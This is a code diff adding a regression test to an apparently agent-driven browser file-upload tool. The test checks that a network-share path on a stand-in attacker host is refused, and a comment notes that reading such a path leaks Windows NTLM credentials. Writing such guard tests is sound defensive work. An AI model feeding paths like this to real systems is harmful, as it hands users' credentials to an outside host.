@@ -1976,6 +1976,13 @@ it.live("an agent answers the page's file picker or sets files on a file input",
       yield* upload({ paths: ["/tmp/b.csv"], locator: "input[type=file]" });
       expect(page.locator).toHaveBeenLastCalledWith("input[type=file]");
       expect(setInputFiles).toHaveBeenCalledWith(["/tmp/b.csv"], expect.anything());
+      // Reading a network path sent the Windows user's NTLM credentials to its host.
+      expect(
+        yield* Effect.flip(
+          upload({ paths: ["//attacker.test/share/a.csv"], locator: "input[type=file]" }),
+        ),
+      ).toMatchObject({ _tag: "PreviewAutomationExecutionError" });
+      expect(setInputFiles).toHaveBeenCalledOnce();
     }),
   ).pipe(Effect.provide(layer)),
 );
